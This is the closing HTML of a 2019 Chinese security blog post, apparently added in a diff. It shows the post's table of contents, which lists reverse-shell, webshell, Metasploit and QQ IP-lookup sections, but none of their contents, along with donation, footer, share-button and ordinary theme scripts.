+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战中可能会用到的几个技巧"><span class="post-toc-number">1.</span> <span class="post-toc-text">实战中可能会用到的几个技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-加密一句话木马"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">md5 加密一句话木马</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹shell"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#出处"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">出处</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux命令反弹shell"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">linux命令反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#python反弹shell"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">python反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#nc反弹shell"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">nc反弹shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php反弹shell"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">php反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php的exec函数反弹"><span class="post-toc-number">1.2.5.1.</span> <span class="post-toc-text">php的exec函数反弹</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php的fsockopen远程连接"><span class="post-toc-number">1.2.5.2.</span> <span class="post-toc-text">php的fsockopen远程连接</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#不死马"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">不死马</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#制作不死马"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">制作不死马</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#上述异常的原因和解决办法"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">上述异常的原因和解决办法</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#杀死不死马"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">杀死不死马</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#metasploit一次实战"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">metasploit一次实战</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#用QQ获取女神的IP"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">用QQ获取女神的IP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#感慨"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">感慨</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.lujingtao.com" target="_blank">主题作者</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.tjuscswyz.cn/" target="_blank">p4ssw0rd</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/ever17/" target="_blank">Ever17</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/tkj521Ya/" target="_blank">Exaggerate~</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.cnblogs.com/jason1999/" target="_blank">jason1999</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://tjublesson.top/" target="_blank">blesson</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://glimmerzcy.github.io" target="_blank">ZCY</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.csdn.net/Harry____" target="_blank">Harry____</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://deamon.tjunsa.com" target="_blank">deamon</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Anti-entropy &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&title=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&pic=https://tjuyjn.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&title=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&source=实战中可能会用到的几个技巧" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《实战中可能会用到的几个技巧》 — Anti-entropy's blog&url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/&via=https://tjuyjn.top" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://tjuyjn.top/2019/07/29/实战中可能会用到的技巧/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3aQXIbMQwEQP//0841VYnWMwAp69B7UsmyxeaBhAf4+oqf77+e53devf73ef7p83cdfvDw8PAWS88X8fzFr97JP5l/76vP4OHh4d3mvTpRZ4f+89/cXCH5mvHw8PA+h9dWrTPAbD14eHh4n8zLMWfjDzw8PLzP4W3K2VnEkMQNSYh8LGvBw8PD61KC6Jj+nNdX+nt4eHh46656fuCeavNvLoP/rBYPDw/vAi8/cBNwWxC37bR2nXh4eHj3eJt/73NwG7/uB7zw8PDwbvCSBv/skji79Lz9Fu09Hh4e3pqXxAF5GT0LXtuxgCjqxcPDw7vM2y8lP9aTcjwpxA/sGR4eHt6IlxSsbXNr01rLL6cfBrbw8PDwLvDyRbfBQXthJIx2Q/Hw8PDu8drFtcFuux2bS6jo7+Hh4eGteW0A0ZbCX6MnKcRXMDw8PLwRb1P+nlpoe7UUjTc8PDy8o7y8GE2ugTZWaIe66sACDw8P7wKvPXbzRlSy9A0s2XQ8PDy8G7xZYpHHsrNtykPeH8prPDw8vF/i5VFFdAuV29cOKNQXAx4eHl7J27Te25Z/W0YXA1XtTBkeHh7eIV579M+GA9qrYgXDw8PDewsvZ+/D2faCmb2Dh4eHd4O3OZrzKHYfT8y+EQ8PD+8GLy+LTzXMkmZYHovUQ1d4eHh4R3l5sfscXrRx8CxQrmfK8PDw8I7yknfyT87K9HZrhjEuHh4e3oL3XT6b62E/klWPF+Dh4eFd4OXPZjRq02DbDNHi4eHh3eMll0ESws7K8WTsIL8Y8PDw8N7Jaw/u2YjVKpCd/S4eHh7eB/Bmbf425piNFNTTZHh4eHhv5OVbkBfcm+ZZcW/g4eHhHeIlEUP+p5PFzVpcbaSLh4eHd4M3+4d/E7a2G3qMgYeHh7fl/QFikZxxdBlqOgAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '不要离开我！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '嘤嘤嘤!太好了~';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+    <script type="text/javascript">           
+        /* 鼠标特效 */ 
+        var a_idx = 0; 
+        jQuery(document).ready(function($) { 
+            $("body").click(function(e) { 
+                var a = new Array("❤好❤","❤看❤","❤就❤","❤留❤","❤个❤","❤言❤","❤吧❤"); 
+                var $i = $("<span></span>").text(a[a_idx]); 
+                a_idx = (a_idx + 1) % a.length; 
+                var x = e.pageX, 
+                y = e.pageY; 
+                $i.css({ 
+                    "z-index": 999999999999999999999999999999999999999999999999999999999999999999999, 
+                    "top": y - 20, 
+                    "left": x, 
+                    "position": "absolute", 
+                    "font-weight": "bold", 
+                    "color": "rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")" 
+                }); 
+                $("body").append($i); 
+                $i.animate({ 
+                    "top": y - 180, 
+                    "opacity": 0 
+                }, 
+                1500, 
+                function() { 
+                    $i.remove(); 
+                }); 
+            }); 
+        }); 
+    </script>
+    <!--动态线条背景-->
+    <script type="text/javascript" color="30,144,255" opacity='0.7' zIndex="-2" count="150" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+</body>
+</html>
